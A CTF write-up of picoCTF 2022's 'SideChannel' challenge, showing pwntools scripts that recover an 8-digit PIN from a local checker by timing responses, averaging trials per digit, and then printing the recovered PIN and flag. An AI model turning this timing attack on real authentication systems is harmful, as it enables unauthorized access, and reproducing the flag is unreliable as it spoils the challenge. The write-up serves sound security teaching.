---
title: picoGym - SideChannel 
date: 2024-03-1
slug: /writeups/picogym-sidechannel
excerpt: Timing-based side channel attack on an pin-checker program
author: Brian Ho
---

SideChannel is a challenge from picoCTF 2022. It is in the 'Forensics' category and worth 400 points. 

# Description
There's something fishy about this PIN-code checker, can you figure out the PIN and get the flag?
Download the PIN checker program here pin_checker
Once you've figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 50364 and provide it the PIN to get your flag.

Hints
- Read about "timing-based side-channel attacks."
- Attempting to reverse-engineer or exploit the binary won't help you, you can figure out the PIN just by interacting with it and measuring certain properties about it.
- Don't run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server.

# Exploration 
My first thoughts were to run the binary:
```
root@superComputer9000:/mnt/c/Users/Brian/pico/gym/forensics/sidechannel# ./pin_checker
Please enter your 8-digit PIN code:
12345678
8
Checking PIN...
Access denied.
root@superComputer9000:/mnt/c/Users/Brian/pico/gym/forensics/sidechannel# ./pin_checker
Please enter your 8-digit PIN code:
1
1
Incorrect length.
```

Okay. So the pin must be a length of 8, and if it is, the file attempts to validate the pin. Based on the hint about timing-based side-channel attacks, I can reasonably infer that my pathway towards the correct pin will involve the validation time in some way. 

I created a basic script to take a pin as a command line argument and print the time taken by the program to process it:
```
from pwn import *
import time
import sys

args = sys.argv[1:] #get command line arguments
pin = args[0] #my command line argument

io = process(['./pin_checker']) #run the file

io.sendline(pin) 
io.recvline() #ignore line that asks for the pin
io.recvline() #ignore line that prints length
io.recvline()  #Checking pin...
start = time.time() #start timing during the processing of the pin
received = io.recvline() #access denied message
end = time.time() #the time it took to reach the access denied message/to process the pin

io.close()
print(f"{end-start}") 
```

A simple test validated that my script worked.
```
root@superComputer9000:/mnt/c/Users/Brian/pico/gym/forensics/sidechannel# python3 writeup.py 00000000
[+] Starting local process './pin_checker': pid 3639
/mnt/c/Users/Brian/pico/gym/forensics/sidechannel/writeup.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(pin)
[*] Stopped process './pin_checker' (pid 3639)
0.17139720916748047
```

I then played around with the command line argument to see how timing was relevant. After I sent the pin `40000000`, I noticed that the processing time was significantly higher than every other digit. 

```
root@superComputer9000:/mnt/c/Users/Brian/pico/gym/forensics/sidechannel# python3 writeup.py 40000000
[+] Starting local process './pin_checker': pid 3660
/mnt/c/Users/Brian/pico/gym/forensics/sidechannel/writeup.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(pin)
[*] Stopped process './pin_checker' (pid 3660)
0.30582261085510254
```
Aha! This must mean that a higher processing time infers a correct digit!!! Let's write a script to loop through each digit, finding the one that takes the most time to process and then adding it to my final digit!

```
from pwn import *
import time

def test_pin(pin):
    io = process(['./pin_checker'])

    io.sendline(pin)
    io.recvline()
    io.recvline()
    io.recvline()  #Checking pin line
    start = time.time()
    received = io.recvline()
    end = time.time()

    io.close()
    return end - start 

def find_pin():
    pin = ""  
    for position in range(8):
        longest_time = 0
        best_digit = ''
        for digit in range(10):
            test_pin_value = pin + str(digit) + "0" * (7 - position)
            time_taken = test_pin(test_pin_value)
            print(f"Testing za pin: {test_pin_value} - Time: {time_taken}")
            if time_taken > longest_time:
                longest_time = time_taken
                best_digit = str(digit)
        pin += best_digit
        print(f"Best digit for position {position+1}: {best_digit}")
    return pin

if __name__ == "__main__":
    final_pin = find_pin()
    print(f"El pin: {final_pin}")
```

After sitting through an entire runthrough, I was excited to see that I received a final pin and that the script was working properly. However, when I tested the pin, it still said access denied. I thought maybe it was because of background programs, or perhaps python being weird, so I closed everything in the background and also put `time.sleep(1)` in my `test_pin()` function. However, after another runthrough, my pin was still being denied. And this time, some of the digits were different! Hmmmm.. what a conundrum. 

# Solution

I eventually came to realize that the timing was inconsistent. Sometimes, a number would randomly skyrocket in processing time, though incorrectly. I did notice though, that a few numbers were consistently high in processing time. 

To address this, I made each PIN go under 5 different trials before returning the average time taken as the value to be compared in the find_pin() function. 
```
from pwn import *
import time

def test_pin(pin, trials=5):
    times=[]
    for trial in range(trials):
        io = process(['./pin_checker'])
        #time.sleep(1) #try adding some delay for better accuracy 
        io.sendline(pin)
        io.recvline()
        io.recvline()
        io.recvline()  #Checking pin...
        start = time.time()
        received = io.recvline()
        end = time.time()

        io.close()
        times.append(end-start)
    return sum(times)/len(times) #putting time delay didnt do much... just run multiple trials and take average  

def find_pin():
    pin = ""
    for position in range(8):
        longest_time = 0
        best_digit = ''
        for digit in range(10):
            test_pin_value = pin + str(digit) + "0" * (7 - position)
            time_taken = test_pin(test_pin_value)
            print(f"Testing za pin: {test_pin_value} - Time: {time_taken}")
            if time_taken > longest_time:
                longest_time = time_taken
                best_digit = str(digit)
        pin += best_digit
        print(f"Best digit for position {position+1}: {best_digit}")
    return pin

if __name__ == "__main__":
    final_pin = find_pin()
    print(f"El pin: {final_pin}")

```
After around 3 minutes of runtime, 
`El pin: 48390513`

Testing locally:
```
root@superComputer9000:/mnt/c/Users/Brian/pico/gym/forensics/sidechannel# ./pin_checker
Please enter your 8-digit PIN code:
48390513
8
Checking PIN...
Access granted. You may use your PIN to log into the master server.
```
Boom. 
```
root@superComputer9000:/mnt/c/Users/Brian/pico/gym/forensics/sidechannel#  nc saturn.picoctf.net 50364
Verifying that you are a human...
Please enter the master PIN code:
48390513
Password correct. Here's your flag:
picoCTF{t1m1ng_4tt4ck_9803bd25}
```

# Flag
```
picoCTF{t1m1ng_4tt4ck_9803bd25}
```

